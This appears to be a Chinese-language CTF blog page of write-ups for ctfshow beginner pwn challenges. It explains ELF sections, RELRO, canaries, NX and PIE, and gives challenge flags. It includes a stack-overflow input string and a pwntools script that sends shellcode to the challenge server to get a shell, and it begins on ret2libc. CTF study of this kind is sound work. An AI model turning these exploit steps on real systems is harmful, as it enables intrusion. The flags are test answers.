@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ctfshow_pwn | JerryXie&#39;s Blog</title>
+<meta name="description" content="CTF, digital forensics, offensive security, and study notes.">
+<meta name="theme-color" content="#f5f5f7">
+<meta name="referrer" content="no-referrer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow_pwn | JerryXie&#39;s Blog">
+<meta property="og:description" content="CTF, digital forensics, offensive security, and study notes.">
+
+  <meta property="og:url" content="https://jerryxie.top/notes/ctf/ctfshow_pwn/">
+  <link rel="canonical" href="https://jerryxie.top/notes/ctf/ctfshow_pwn/">
+
+
+  <meta name="author" content="JerryXie">
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="/js/main.js"></script>
+
+  <meta name="generator" content="Hexo 8.1.1"></head>
+  <body>
+    <div class="scroll-progress" data-scroll-progress></div>
+    <div class="site-shell">
+      
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark"></span>
+      <span class="brand-name">JerryXie&#39;s Blog</span>
+    </a>
+
+    <button class="menu-toggle" type="button" data-menu-toggle aria-label="Toggle navigation">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" data-menu-panel>
+      
+        <a href="/" class="">Home</a>
+      
+        <a href="/archives/" class="">Archive</a>
+      
+        <a href="/categories/" class="">Library</a>
+      
+        <a href="/about/" class="">About</a>
+      
+    </nav>
+
+    <button class="theme-toggle" type="button" data-theme-toggle aria-label="Toggle theme">
+      <span data-theme-icon>Dark</span>
+    </button>
+  </div>
+</header>
+
+      <main class="page-shell">
+        
+
+<article class="article-layout">
+  <div class="article-main card-panel">
+    <a class="back-link" href="/categories/">Back to library</a>
+    <header class="article-header">
+      <div class="article-badges">
+        
+          
+            <a class="category-chip" href="/categories/ctf/">ctf</a>
+          
+        
+      </div>
+      <h1>ctfshow_pwn</h1>
+      <div class="article-meta">
+        <span>Published 2026-04-19</span>
+        <span>Updated 2026-04-19</span>
+        <span>20 min</span>
+      </div>
+      
+        <p class="article-source">Source path: <code>ctf/ctfshow_pwn.md</code></p>
+      
+    </header>
+
+    <div class="article-content">
+      <h1 id="hui’bctfshow-pwn入门"><a href="#hui’bctfshow-pwn入门" class="headerlink" title="hui’bctfshow pwn入门"></a>hui’bctfshow pwn入门</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>连上即可<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758012277062-0b91e1c4-3ffb-43cf-93c5-0ec71ea2d7a4.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>cat</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758012346320-3568c78a-f318-4830-8967-fd20d002e0e1.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758012661155-ef55cce2-56fe-48a2-8a5c-bed2c61e7e37.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>多个选项、选择6即可（连接到flag）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758012706446-18d6bd52-f627-46b9-9cdb-b6c5a5fa2648.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>其实看ida也行</p>
+<h2 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758013010989-2309a057-922b-4ea4-87ac-fd777b6994e9.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>比对“ strcpy(s1, “CTFshowPWN”);”，也就是输入 CTFshowPWN即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758013051930-3a629289-b5f6-4a46-a701-7933e414c0b4.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>cat &#x2F;ctfshow_flag即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758013074081-e1915839-f0c0-44b7-b4e5-ce5e1437216c.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h2 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17:"></a>pwn17:</h2><h5 id="utunbu的终端指令-cat-ctf"><a href="#utunbu的终端指令-cat-ctf" class="headerlink" title="utunbu的终端指令&#x2F;;cat ctf*"></a>utunbu的终端指令&#x2F;;cat ctf*</h5><p>用于<strong>显示文件内容</strong>或<strong>连接多个文件,这里是以ctf开头的内容</strong> </p>
+<h5 id="read-0-buf-0x20uLL"><a href="#read-0-buf-0x20uLL" class="headerlink" title="read(0, buf, 0x20uLL);"></a>read(0, buf, 0x20uLL);</h5><p>read() 函数是一个 UNIX 系统调用，通常用于从文件描述符中读取数据。</p>
+<p>用法：ssize_t read(int fd, void *buf, size_t count);</p>
+<p>fd：文件描述符，表示要读取的文件或者输入源。在 UNIX 系统中，0 表示标准输入(STDIN)，1 表示标准输出(STDOUT)，2 表示标准错误(STDERR)。</p>
+<p>文件描述符0：用于接收用户输入或者从管道、重定向或者其他输入源读取数据。</p>
+<p>文件描述符1：用于向终端或者其他输出目标输出数据。</p>
+<p>buf：指向存储读取数据的缓冲区的指针。</p>
+<p>count：要读取的最大字节数。</p>
+<p>这行代码从标准输入（文件描述符为0）读取最多10个字符到缓冲区 buf 中。</p>
+<p>0xAuLL是十六进制表示的 10，表示最多读取 10 个字符。</p>
+<h5 id="3-和-的用法和区别"><a href="#3-和-的用法和区别" class="headerlink" title="3.&gt;和&gt;&gt;的用法和区别"></a>3.&gt;和&gt;&gt;的用法和区别</h5><blockquote>
+<p>: 将命令的输出重定向到指定文件，如果文件不存在则创建，如果存在则覆盖文件内容；</p>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>: 将命令的输出追加到指定文件的末尾，如果文件不存在则创建。</p>
+</blockquote>
+</blockquote>
+<h2 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h2><h5 id="1-fork-函数的作用"><a href="#1-fork-函数的作用" class="headerlink" title="1.fork 函数的作用"></a>1.<code>fork</code> 函数的作用</h5><p>在 Linux&#x2F;Unix 系统中，<code>fork</code> 是一个系统调用，用于创建一个新的进程（子进程）。调用 <code>fork</code> 后，父进程和子进程会同时执行，但它们的返回值不同：</p>
+<ul>
+<li>父进程返回子进程的进程 ID（PID）(每个进程都有一个唯一的数字标识符，即进程ID。).</li>
+<li>子进程返回 <code>0</code>.</li>
+</ul>
+<h5 id="2-exec-函数的作用"><a href="#2-exec-函数的作用" class="headerlink" title="2.exec 函数的作用"></a>2.<code>exec</code> 函数的作用</h5><p><code>exec</code> 是一组用于<strong>替换当前进程映像</strong>的函数。它们的作用是将当前进程的代码、数据和堆栈替换为另一个程序的代码、数据和堆栈，从而实现程序的加载和执行。</p>
+<h5 id="3-1-0的意义"><a href="#3-1-0的意义" class="headerlink" title="3.1&gt;&amp;0的意义"></a>3.1&gt;&amp;0的意义</h5><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741526885207-b334fdc9-de1a-4db5-b555-8481480017e8.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>1&gt;&amp;0 这种输入&#x2F;输出重定向操作符的作用是将标准输出重定向到标准输入，这种操作可以将一个进程的输出作为另一个进程的输入。在Unix&#x2F;Linux系统中，每个进程都有三个默认打开的文件描述符：标准输入（文件描述符0）、标准输出（文件描述符1）、标准错误（文件描述符2）。通过将标准输出重定向到标准输入，可以实现将一个进程的输出传递给另一个进程。</p>
+<p>1&gt;&amp;0 命令是在子进程中执行的，因为它在 else 分支中，1&gt;&amp;0 重定向子进程的标准输出到标准输入，因此<strong>子进程的输出会被发送到父进程的标准输入</strong>。</p>
+<h2 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h2><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
+<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p>
+<p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p>
+<p>若某个表不存在，则无需写其对应地址</p>
+<p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741605328687-f91c05d8-1a59-4c83-86cd-6c1c975c6441.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h5 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h5><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741605052455-77161d1b-f3fe-41d4-9eb2-e536d01209b5.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h5 id="知识（got-和-got-plt）："><a href="#知识（got-和-got-plt）：" class="headerlink" title="知识（got 和 .got.plt）："></a>知识（got 和 .got.plt）：</h5><p><strong>.got 和 .got.plt</strong> 是 ELF（Executable and Linkable Format，可执行和可链接格式）二进制文件中的两个重要部分，用于实现动态链接和延迟绑定（lazy binding）。</p>
+<h6 id="got-表（Global-Offset-Table，全局偏移表）："><a href="#got-表（Global-Offset-Table，全局偏移表）：" class="headerlink" title=".got 表（Global Offset Table，全局偏移表）："></a><strong>.got 表</strong>（Global Offset Table，全局偏移表）：</h6><p>.got 表是一个在程序加载时由动态链接器填充的表，包含了程序中所有需要在运行时动态解析的全局变量和函数的地址。这些地址最初是未知的，直到程序在内存中加载并开始执行时才会被解析和填充。当程序<strong>第一次</strong>执行到一个<strong>全局变量或者函数</strong>时，动态链接器会通过查找该<strong>符号的地址</strong>并将其写入 .got 表中，这样下次再次访问这个符号时就不需要再次查找。</p>
+<h6 id="got-plt-表（Procedure-Linkage-Table，过程链接表）："><a href="#got-plt-表（Procedure-Linkage-Table，过程链接表）：" class="headerlink" title=".got.plt 表（Procedure Linkage Table，过程链接表）："></a>.<strong>got.plt 表</strong>（Procedure Linkage Table，过程链接表）：</h6><p>.got.plt 表是在程序中用于实现<strong>延迟绑定</strong>的一种数据结构，用于处理程序中对动态链接库函数的调用。当程序<strong>第一次调用</strong>一个动态链接库中的<strong>函数</strong>时，其<strong>对应的入口地址</strong>会被写入到 .got.plt 表中。然后，动态链接器会跳转到 PLT 中的相应入口，执行一系列指令，最终将函数的实际地址写入 .got.plt 表中，并跳转到该地址执行函数。下次再调用这个函数时，程序会直接跳转到 .got.plt 表中存储的函数地址，而不需要再次执行 PLT 中的指令序列。</p>
+<h5 id="提示：What-is-RELRO-protection"><a href="#提示：What-is-RELRO-protection" class="headerlink" title="提示：What is RELRO protection ?"></a>提示：What is RELRO protection ?</h5><h6 id="RELRO（RELocation-Read-Only）-保护"><a href="#RELRO（RELocation-Read-Only）-保护" class="headerlink" title="**RELRO（RELocation Read-Only）**保护"></a>**RELRO（RELocation Read-Only）**保护</h6><p>一种针对二进制可执行文件的安全性措施，用于防止针对程序中<strong>全局偏移表</strong>（GOT）和程序加载时<strong>动态链接器</strong>（LD）的攻击，确保<strong>全局偏移表</strong>（GOT）和<strong>过程链接表</strong>（PLT）在程序加载后被设为只读，从而使得攻击者无法修改这些表以执行恶意代码注入或覆盖函数指针等攻击。</p>
+<h6 id="RELRO-的几种常见类型："><a href="#RELRO-的几种常见类型：" class="headerlink" title="RELRO 的几种常见类型："></a>RELRO 的几种常见类型：</h6><p>1、<strong>NO RELRO</strong>：这种状态下 GOT 和 PLT 都是可写的。（.got 与 .got.plt 都可写。）</p>
+<p>2、<strong>Partial RELRO</strong>：将全局偏移表（GOT）的非空项设为只读，而对于空项则保持可写。（.got 不可写而 .got.plt 可写。）</p>
+<p>3、<strong>Full RELRO</strong>：在程序加载后将全局偏移表（GOT）和过程链接表（PLT）的所有项都设置为只读，即使这些项为空。任何对这些表的修改都会导致程序异常终止。（.got 与 .got.plt 都不可写。）</p>
+<h5 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h5><p>1.检查附件<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741605858602-1f664ed3-ff7b-4ce6-bebc-377462ace1d4.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>也就是说ctfshow{1_1_</p>
+<p>2.显示 ELF 格式文件信息</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></table></figure>
+
+<p>readelf 是一个用于显示 ELF 格式文件信息的工具，而 -S 选项用于显示 ELF （Executable and Linkable Format，可执行和可链接格式）文件中的节表（section headers）信息，节表包含了关于 ELF 文件中每个节的详细信息，例如节的名称、偏移、大小、对齐方式等。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741606245574-65181d32-db43-477a-ae80-5bd67df8bf2f.png" referrerpolicy="no-referrer" loading="lazy" decoding="async">然后找到.got和.got.plt的这一栏</p>
+<p>所以答案就是ctfshow{1_1_0x600f18_0x600f28}</p>
+<h2 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h2><h5 id="题目、伪代码和知识点与20基本一致"><a href="#题目、伪代码和知识点与20基本一致" class="headerlink" title="题目、伪代码和知识点与20基本一致"></a>题目、伪代码和知识点与20基本一致</h5><h5 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h5><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741606780909-080577d3-5e03-47ca-9ca8-5f496cc9a246.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>根据刚才的知识点来看这里的partial RELRO可知**.got 不可写而 .got.plt 可写**</p>
+<p>readelf -S pwn来看二者地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741607086253-8fb1a6e6-fd7b-4ca4-8878-0b03f158f110.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>所以答案就是ctfshow{0_1_0x600ff0_0x601000}</p>
+<h2 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h2><h5 id="题目、伪代码和知识点与20基本一致-1"><a href="#题目、伪代码和知识点与20基本一致-1" class="headerlink" title="题目、伪代码和知识点与20基本一致"></a>题目、伪代码和知识点与20基本一致</h5><h5 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h5><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741607280702-ab216361-6e9b-48b0-b9fc-ba68b6f10898.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>根据刚才的知识点来看这里的partial RELRO可知**.got 与 .got.plt 都不可写**<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741607333655-1753b3e0-b963-402d-a46d-662ba7c280c7.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>然后这里.got.plt没有，所以答案就是ctfshow{0_0_0x600fc0}</p>
+<p>总结：202122三道题都是让我用checksec来看RELRO可不可写，然后用readelf -S pwn来找.got和.got.plt的地址</p>
+<h2 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h2><h5 id="题目-伪代码"><a href="#题目-伪代码" class="headerlink" title="题目+伪代码"></a>题目+伪代码</h5><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741690804888-5bb15bc6-6f34-453f-a314-9a6631d0f915.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __gid_t v3; // eax</span><br><span class="line">  int v5; // [esp-Ch] [ebp-2Ch]</span><br><span class="line">  int v6; // [esp-8h] [ebp-28h]</span><br><span class="line">  int v7; // [esp-4h] [ebp-24h]</span><br><span class="line">  FILE *stream; // [esp+4h] [ebp-1Ch]</span><br><span class="line">//stream 是一个指向 FILE 结构的指针，用于打开文件 &quot;/ctfshow_flag&quot; 以供读取；</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  //如果文件打开失败，则打印错误信息并退出程序；</span><br><span class="line">  </span><br><span class="line">  fgets(flag, 64, stream);</span><br><span class="line">  //使用 fgets 函数从文件中读取最多 64 个字符到全局数组 flag 中；</span><br><span class="line">  </span><br><span class="line">  signal(11, (__sighandler_t)sigsegv_handler);</span><br><span class="line">  //使用 signal 函数注册一个信号处理函数 sigsegv_handler，处理段错误信号；</span><br><span class="line">  </span><br><span class="line">  v3 = getegid();</span><br><span class="line">  //获取有效组 ID (egid) 并设置实际、有效和保存的组 ID 为相同值；</span><br><span class="line">  </span><br><span class="line">  setresgid(v3, v3, v3, v5, v6, v7, v3);</span><br><span class="line">  puts(asc_8048940);</span><br><span class="line">  puts(asc_80489B4);</span><br><span class="line">  puts(asc_8048A30);</span><br><span class="line">  puts(asc_8048ABC);</span><br><span class="line">  puts(asc_8048B4C);</span><br><span class="line">  puts(asc_8048BD0);</span><br><span class="line">  puts(asc_8048C64);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : Linux_Security_Mechanisms                               &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : No canary found                                         &quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(&quot;How to input ?&quot;); //依次打印一系列字符串，包括一些提示信息和说明；</span><br><span class="line">  if ( argc &gt; 1 )</span><br><span class="line">    ctfshow((char *)argv[1]);</span><br><span class="line">    //如果命令行参数的数量大于 1，则调用 ctfshow 函数，传递第一个命令行参数作为参数；</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="wp-3"><a href="#wp-3" class="headerlink" title="wp"></a>wp</h5><h6 id="关于这个-argc-的解释："><a href="#关于这个-argc-的解释：" class="headerlink" title="关于这个 argc 的解释："></a>关于这个 <strong>argc</strong> 的解释：</h6><p>argc 是 C 和 C++ 中的一个参数，代表命令行参数的数量。通常在程序启动时，操作系统会将命令行输入的参数传递给程序。argc 表示参数的数量，包括程序名称在内。例如，如果在命令行中输入 .&#x2F;program arg1 arg2，则 argc 的值将是 3，因为有三个参数，分别是程序名称、”arg1” 和 “arg2”。</p>
+<h6 id="Canary保护-素？"><a href="#Canary保护-素？" class="headerlink" title="Canary保护 素？"></a>Canary保护 素？</h6><p><strong>Canary保护机制</strong>是一种<strong>栈溢出保护技术</strong>，用于防止缓冲区溢出攻击。当函数<strong>存在缓冲区</strong>溢出漏洞时，攻击者可以通过覆盖栈上的返回地址来执行恶意代码。启用Canary保护后，函数执行时会先在栈上插入一个随机数（称为canary），并在函数返回前验证该随机数是否被改变。如果随机数被改变，说明可能发生了栈溢出，从而阻止恶意代码的执行‌。</p>
+<p>所以说，在<strong>没有canary保护机制存在</strong>的程序中，可以利用栈溢出的方式来攻击这个程序~</p>
+<p>belike：$ .&#x2F;pwnme 1111111111111111111112222222222222222222233333333333333333333333333333333333333333333333333</p>
+<p>得到答案：ctfshow{21278169-d7cb-46ba-a948-13cdcbf18e1d}</p>
+<h2 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h2><h5 id="前置知识点：checksec的具体内容含义（以这道题为例）"><a href="#前置知识点：checksec的具体内容含义（以这道题为例）" class="headerlink" title="前置知识点：checksec的具体内容含义（以这道题为例）"></a>前置知识点：checksec的具体内容含义（以这道题为例）</h5><h6 id="1-Arch-i386-32-little"><a href="#1-Arch-i386-32-little" class="headerlink" title="1. Arch: i386-32-little"></a>1. <strong>Arch: i386-32-little</strong></h6><ul>
+<li><strong>含义</strong>：表示程序的架构信息。<ul>
+<li><code>i386-32</code>：指该程序是 <strong>32 位</strong>的 Intel x86 架构（即传统的 32 位程序）。</li>
+<li><code>little</code>：表示采用<strong>小端字节序</strong>（Little-Endian），即数据的高字节存储在内存的高地址，低字节存储在低地址。</li>
+</ul>
+</li>
+<li><strong>安全影响</strong>：32 位架构的地址空间较小，部分漏洞利用（如 ROP 链构造）可能更简单，但需结合其他保护机制综合评估<strong>1****3</strong>。</li>
+</ul>
+<hr>
+<h6 id="2-RELRO-Partial-RELRO"><a href="#2-RELRO-Partial-RELRO" class="headerlink" title="2. RELRO: Partial RELRO"></a>2. <strong>RELRO: Partial RELRO</strong></h6><ul>
+<li><strong>全称</strong>：<strong>Relocation Read-Only</strong>（重定位只读）。</li>
+<li><strong>作用</strong>：保护程序的动态链接信息（如 <code>.got</code> 和 <code>.plt</code> 表），<strong>防止攻击者篡改函数地址</strong>。<ul>
+<li><strong>Partial RELRO</strong>：是默认模式，仅对部分动态链接表项进行限制，<code>.got</code> 表在首次调用函数前仍可写，存在被劫持的风险<strong>1****3</strong>。</li>
+<li><strong>对比</strong>：若为 <code>Full RELRO</code>，则所有动态链接表在加载后标记为只读，安全性更高，但会增加程序启动时间<strong>2****6</strong>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h6 id="3-Stack-No-canary-found"><a href="#3-Stack-No-canary-found" class="headerlink" title="3. Stack: No canary found"></a>3. <strong>Stack: No canary found</strong></h6><ul>
+<li><strong>全称</strong>：<strong>Stack Canary</strong>（栈保护机制）。<strong>其实就是上道题的那个东西</strong></li>
+<li><strong>作用</strong>：在函数返回地址前插入随机值（金丝雀值），若检测到该值被篡改则终止程序，防止栈溢出攻击。<ul>
+<li><strong>No canary found</strong>：<strong>未启用该保护</strong>，<strong>栈溢出可直接覆盖返回地址</strong>，攻击难度较低<strong>15</strong>。</li>
+<li><strong>启用参数</strong>：通过 <code>-fstack-protector</code> 编译选项开启（默认部分函数保护）<strong>2****4</strong>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h6 id="4-NX-NX-disabled"><a href="#4-NX-NX-disabled" class="headerlink" title="4. NX: NX disabled"></a>4. <strong>NX: NX disabled</strong></h6><ul>
+<li><strong>全称</strong>：No-eXecute（<strong>不可执行内存保护</strong>）。</li>
+<li><strong>作用</strong>：将<strong>栈和堆内存</strong>标记为不可执行，防止攻击者注入并执行 Shellcode。<ul>
+<li><strong>NX disabled</strong>：禁用该保护，允许在<strong>栈或堆上执行代码</strong>，可直接利用 <strong>Shellcode</strong> 攻击<strong>15</strong>。</li>
+<li><strong>启用参数</strong>：通过 <code>-z noexecstack</code> 编译选项开启（默认启用）<strong>2****4</strong>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h6 id="5-PIE-No-PIE-0x8048000"><a href="#5-PIE-No-PIE-0x8048000" class="headerlink" title="5. PIE: No PIE (0x8048000)"></a>5. <strong>PIE: No PIE (0x8048000)</strong></h6><ul>
+<li><strong>全称</strong>：Position Independent Executable（<strong>地址无关可执行文件</strong>）。</li>
+<li><strong>作用</strong>：随机化程序加载基址（ASLR 的一部分），增加预测内存地址的难度。<ul>
+<li><strong>No PIE</strong>：程序基址固定（如 <code>0x8048000</code>），攻击者可利用静态地址构造漏洞利用链<strong>1****5</strong>。</li>
+<li><strong>启用参数</strong>：通过 <code>-fPIE -pie</code> 编译选项开启，需配合操作系统 ASLR 生效<strong>2****6</strong>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h6 id="6-RWX-Has-RWX-segments"><a href="#6-RWX-Has-RWX-segments" class="headerlink" title="6. RWX: Has RWX segments"></a>6. <strong>RWX: Has RWX segments</strong></h6><ul>
+<li><strong>全称</strong>：Read-Write-eXecute（<strong>可读、可写、可执行的内存段</strong>）。</li>
+<li><strong>作用</strong>：标识程序中是否存在同时具备读<strong>写执行权限的内存区域</strong>。<ul>
+<li><strong>Has RWX segments</strong>：存在此类内存段，攻击者可写入恶意代码并直接执行，风险极高<strong>5****7</strong>。</li>
+<li><strong>典型场景</strong>：未启用 NX 或代码段被错误配置时可能出现。</li>
+</ul>
+</li>
+</ul>
+<h5 id="题目-伪代码-1"><a href="#题目-伪代码-1" class="headerlink" title="题目+伪代码"></a>题目+伪代码</h5><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741780789906-88874b12-78e2-4ad6-bb63-adc3850ed0ce.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"><br><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741780800272-9d4da925-1c2d-47a3-a296-87adf84e475f.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>（这里的ctfshow函数没有办法访问）</p>
+<h5 id="wp-4"><a href="#wp-4" class="headerlink" title="wp"></a>wp</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741782335159-9244a54b-0e56-49e1-8a12-9bbae4e373da.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></h5><p>因为这里的<strong>NX disabled</strong>所以可以直接用shellcode来攻击</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *  # 导入 pwntools 库中的所有函数和类</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;  # 设置 pwntools 的日志级别为调试模式</span><br><span class="line"># p = process(&#x27;./pwn&#x27;)  # 本地连接</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28236)  # 远程连接</span><br><span class="line">shellcode = asm(shellcraft.sh())  </span><br><span class="line">payload = shellcode</span><br><span class="line"># 使用 pwntools 的 shellcraft 模块生成一个 shellcode，并使用 asm 函数将其汇编成二进制指令</span><br><span class="line">p.sendline(payload)  # 发送 payload 到远程连接</span><br><span class="line">p.interactive()  # 与远程连接进行交互</span><br></pre></td></tr></table></figure>
+
+<p>从而获取shell</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741861800574-628280b6-a3a7-41e7-acc9-60e9bb6a1dca.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>然后cat ctfshow_flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741861858653-9f96c69a-c6e8-47e3-bcbc-4a87ff2c381b.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h2 id="undo-pwn25"><a href="#undo-pwn25" class="headerlink" title="undo pwn25"></a>undo pwn25</h2><h4 id="题目信息-伪代码"><a href="#题目信息-伪代码" class="headerlink" title="题目信息+伪代码"></a>题目信息+伪代码</h4><p>HINT：开启NX保护，或许可以试试ret2libc</p>
+<h4 id="前置概念：ret2libc"><a href="#前置概念：ret2libc" class="headerlink" title="前置概念：ret2libc"></a>前置概念：ret2libc</h4><p><code>ret2libc</code>（Return-to-libc）是一种常见的漏洞利用技术，通常用于绕过 <strong>NX（No-Execute）保护</strong>。当程序启用了 NX 保护时，栈上的代码无法执行，因此无法直接通过栈溢出执行 Shellcode。<code>ret2libc</code> 通过调用已有的函数（如 <code>system</code> 或 <code>execve</code>）来实现漏洞利用。</p>
+<hr>
+<h5 id="1-ret2libc-的核心思想"><a href="#1-ret2libc-的核心思想" class="headerlink" title="1. ret2libc 的核心思想"></a><strong>1. ret2libc 的核心思想</strong></h5><ul>
+<li><strong>利用已有的函数</strong>：程序通常会加载标准库 <code>libc</code>，其中包含许多有用的函数（如 <code>system</code>、<code>execve</code>、<code>exit</code> 等）。</li>
+<li><strong>覆盖返回地址</strong>：通过栈溢出覆盖返回地址，使其跳转到目标函数（如 <code>system</code>）。</li>
+<li><strong>传递参数</strong>：为目标函数提供正确的参数（如 <code>/bin/sh</code> 的地址）。</li>
+</ul>
+<hr>
